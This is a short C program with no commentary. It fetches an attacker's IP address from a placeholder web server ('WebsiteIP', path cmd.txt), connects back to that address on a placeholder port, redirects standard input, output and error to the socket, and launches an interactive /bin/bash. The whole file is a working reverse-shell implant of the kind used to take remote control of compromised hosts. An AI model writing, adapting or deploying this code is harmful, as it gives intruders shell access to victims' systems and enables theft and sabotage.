#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>
#define MAX 512

main()
{ 
        int sockfd;
        int sockfd2;
        struct sockaddr_in remaddr;
        struct sockaddr_in remaddr2;
        char GET[] = "GET /directorytocmd.txt/cmd.txt\n";
		char RECV[MAX];
        char IP[MAX];    

        sockfd2 = socket(PF_INET, SOCK_STREAM, 0);

        remaddr2.sin_family = AF_INET;
        remaddr2.sin_port = htons(80);
        remaddr2.sin_addr.s_addr = inet_addr("WebsiteIP");
        memset(remaddr2.sin_zero, 0, sizeof(remaddr2.sin_zero));

        connect(sockfd2, (struct sockaddr *)&remaddr2, sizeof(struct sockaddr));
        write(sockfd2,GET,strlen(GET));
        read(sockfd2,RECV,MAX);
        printf("%s\n",RECV);
		strcpy(IP,RECV);
		close(sockfd2);
        
        sockfd = socket(PF_INET, SOCK_STREAM, 0);

        remaddr.sin_family = AF_INET;
        remaddr.sin_port = htons(YourPort);
        remaddr.sin_addr.s_addr = inet_addr(IP);
        memset(remaddr.sin_zero, 0, sizeof(remaddr.sin_zero));

        connect(sockfd, (struct sockaddr *)&remaddr, sizeof(struct sockaddr));
        dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2);
        execl("/bin/bash", "/bin/bash", "-i", NULL);
        
        close(sockfd);
}
